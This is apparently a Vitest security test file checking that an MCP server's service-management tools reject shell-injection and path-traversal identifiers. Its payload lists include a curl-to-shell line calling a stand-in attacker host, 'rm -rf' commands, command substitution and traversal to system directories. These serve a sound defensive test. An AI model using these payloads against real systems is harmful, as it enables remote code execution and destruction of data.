/**
 * #2452 — MCP service-lifecycle tools must reject unvalidated identifiers.
 *
 * `manage_service` / `deploy_service` / `rename_service` / `delete_service` /
 * `restore_trashed_service` (and the read-side `get_service_files`) declared
 * their `name`/`oldName`/`newName`/`id` params as bare `z.string()`, while the
 * equivalent REST routes (`app/api/services/[name]/**`) parse the same values
 * through the strict `ServiceName` schema. Every one of those strings is
 * interpolated *unescaped* into a shell command string on the node —
 * `systemctl --user stop ${name}.service`, `mkdir -p '${trashDir}'`,
 * `mv ${oldYamlPath} ${newYamlPath}`, `rm -rf '${trashRoot}/${trashId}'`
 * (services/serviceLifecycle.ts) — so a lifecycle/mutate-scoped token could
 * turn a narrow grant into arbitrary shell execution.
 *
 * These are attempted-injection tests: they drive the REAL MCP server over the
 * in-memory transport with hostile payloads and assert two things per payload —
 * the call is rejected with a legible error, AND no ServiceManager method was
 * ever entered (i.e. nothing reached exec).
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';

const serviceManagerMock = {
  startService: vi.fn(async () => undefined),
  stopService: vi.fn(async () => undefined),
  restartService: vi.fn(async () => undefined),
  forceUpdateService: vi.fn(async () => ({ ok: true })),
  getServiceStatus: vi.fn(async () => ({ active: true })),
  getServiceFiles: vi.fn(async () => ({ kubeContent: '', yamlContent: '', quadletKind: 'kube' })),
  deployKubeService: vi.fn(async () => undefined),
  deployContainerQuadlet: vi.fn(async () => undefined),
  renameService: vi.fn(async () => undefined),
  deleteService: vi.fn(async () => undefined),
  listTrashedServices: vi.fn(async () => []),
  restoreTrashedService: vi.fn(async () => ({ service: 'media' })),
  purgeTrash: vi.fn(async () => ({ purged: [] })),
};

vi.mock('@/lib/services/ServiceManager', () => ({ ServiceManager: serviceManagerMock }));

async function connectClient() {
  const { createMcpServer } = await import('./server');
  const server = createMcpServer();
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: 'test-client', version: '1.0.0' });
  await Promise.all([client.connect(clientTransport), server.connect(serverTransport)]);
  return { client };
}

/** A tool call that must NOT reach a handler. Normalises the two shapes a
 *  rejection can take (a thrown McpError for schema failure, or an isError
 *  result) into `{ rejected, message }`. */
async function callExpectingRejection(
  client: Client,
  name: string,
  args: Record<string, unknown>,
): Promise<{ rejected: boolean; message: string }> {
  try {
    const res = (await client.callTool({ name, arguments: args })) as {
      isError?: boolean;
      content?: Array<{ text?: string }>;
    };
    return {
      rejected: Boolean(res.isError),
      message: (res.content ?? []).map(c => c.text ?? '').join('\n'),
    };
  } catch (err) {
    return { rejected: true, message: err instanceof Error ? err.message : String(err) };
  }
}

const noServiceManagerCall = () => {
  for (const [fnName, fn] of Object.entries(serviceManagerMock)) {
    expect(fn, `ServiceManager.${fnName} must not be reached`).not.toHaveBeenCalled();
  }
};

// Shell metacharacters + path traversal. Each of these, interpolated into the
// command strings in serviceLifecycle.ts, is arbitrary code or file access.
const HOSTILE_NAMES = [
  'media; rm -rf ~/.config',
  'media && curl http://attacker.example/x | sh',
  'media$(id)',
  'media`id`',
  'media | tee /tmp/pwned',
  '../../../../etc/systemd/system/evil',
  'media\nsystemctl --user stop nginx',
  'media > /dev/null',
  "media'; touch /tmp/pwned; '",
  'media with spaces',
];

const HOSTILE_TRASH_IDS = [
  '..',
  '../..',
  '../../.config/containers/systemd',
  'x; rm -rf ~',
  'x$(id)',
  '.trash',
  'a/b',
];

beforeEach(() => {
  for (const fn of Object.values(serviceManagerMock)) fn.mockClear();
});

describe('#2452 — MCP service tools reject shell-metacharacter / traversal service names', () => {
  const cases: Array<{ tool: string; build: (payload: string) => Record<string, unknown> }> = [
    { tool: 'manage_service', build: p => ({ action: 'start', name: p, node: 'local' }) },
    { tool: 'manage_service', build: p => ({ action: 'force-update', name: p, node: 'local' }) },
    { tool: 'get_service_files', build: p => ({ name: p, node: 'local' }) },
    { tool: 'deploy_service', build: p => ({ name: p, kubeContent: 'apiVersion: v1\nkind: Pod\n', node: 'local' }) },
    { tool: 'rename_service', build: p => ({ oldName: p, newName: 'media', node: 'local' }) },
    { tool: 'rename_service', build: p => ({ oldName: 'media', newName: p, node: 'local' }) },
    { tool: 'delete_service', build: p => ({ name: p, node: 'local' }) },
  ];

  for (const { tool, build } of cases) {
    const paramLabel = Object.keys(build('X')).find(k => build('X')[k] === 'X') ?? 'name';
    for (const payload of HOSTILE_NAMES) {
      it(`${tool} (${paramLabel}) refuses ${JSON.stringify(payload)}`, async () => {
        const { client } = await connectClient();
        const { rejected, message } = await callExpectingRejection(client, tool, build(payload));
        expect(rejected, `${tool} accepted ${JSON.stringify(payload)}`).toBe(true);
        expect(message.toLowerCase()).toMatch(/invalid service name|invalid arguments/);
        noServiceManagerCall();
        await client.close();
      });
    }
  }
});

describe('#2452 — restore/purge trash tools reject traversal trash ids', () => {
  for (const tool of ['restore_trashed_service', 'purge_trashed_service']) {
    for (const payload of HOSTILE_TRASH_IDS) {
      it(`${tool} refuses ${JSON.stringify(payload)}`, async () => {
        const { client } = await connectClient();
        const { rejected, message } = await callExpectingRejection(client, tool, { id: payload, node: 'local' });
        expect(rejected, `${tool} accepted ${JSON.stringify(payload)}`).toBe(true);
        expect(message.toLowerCase()).toMatch(/invalid trash id|parent traversal|leading dot|invalid arguments/);
        noServiceManagerCall();
        await client.close();
      });
    }
  }
});

describe('#2452 — legitimate identifiers still pass through', () => {
  it('manage_service start reaches ServiceManager for a normal service name', async () => {
    const { client } = await connectClient();
    const res = await client.callTool({ name: 'manage_service', arguments: { action: 'start', name: 'media', node: 'local' } });
    expect(res.isError).toBeFalsy();
    expect(serviceManagerMock.startService).toHaveBeenCalledWith('local', 'media');
    await client.close();
  });

  it('accepts the systemd-legal characters ServiceName allows (@ . - _ :)', async () => {
    const { client } = await connectClient();
    const res = await client.callTool({ name: 'get_service_files', arguments: { name: 'sb-agent@core.service', node: 'local' } });
    expect(res.isError).toBeFalsy();
    expect(serviceManagerMock.getServiceFiles).toHaveBeenCalledWith('local', 'sb-agent@core.service');
    await client.close();
  });

  it('restore_trashed_service accepts a real generated trash id', async () => {
    const { client } = await connectClient();
    const trashId = '2026-07-29T12-34-56-789Z-media';
    const res = await client.callTool({ name: 'restore_trashed_service', arguments: { id: trashId, node: 'local' } });
    expect(res.isError).toBeFalsy();
    expect(serviceManagerMock.restoreTrashedService).toHaveBeenCalledWith('local', trashId);
    await client.close();
  });
});
